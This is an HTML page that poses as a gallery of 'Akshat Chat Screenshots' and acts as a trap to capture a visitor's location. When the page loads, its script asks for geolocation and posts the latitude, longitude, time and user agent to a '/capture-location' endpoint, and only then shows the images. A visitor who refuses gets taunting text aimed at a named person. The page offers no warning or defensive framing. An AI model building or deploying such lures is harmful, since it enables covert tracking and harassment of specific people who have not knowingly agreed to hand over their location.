<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .content, .denied {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
    </style>
</head>
<body>

    <!-- Main Content -->
    <div class="content" id="content">
        <h1>Akshat Chat Screenshots</h1>
        <p>Loading screenshots...</p>
        <img src="/static/0jAV3.png" alt="">
        <img src="/static/dX66Z.png" alt="">
        <img src="/static/JQyOg.png" alt="">
        <img src="/static/aryUv.png" alt="">
        <img src="/static/CiyTj.png" alt="">
    </div>

    <!-- Denied -->
    <div class="denied" id="denied">
        <h2>Akshat we know its you</h2>
        <h2>We have blocked your location</h2>
        <h2>We ain't showing you what's in this website</h2>
        <img src="/static/satvik.jpg" alt="">
    </div>

    <script>
        window.onload = function() {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Send location
                    fetch('/capture-location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    })
                    .then(() => {
                        document.getElementById('content').style.display = 'flex';
                    })
                    .catch(() => {
                        document.getElementById('content').style.display = 'flex'; // show anyway
                    });
                },
                function() {
                    document.getElementById('denied').style.display = 'flex';
                }
            );
        };
    </script>
</body>
</html>
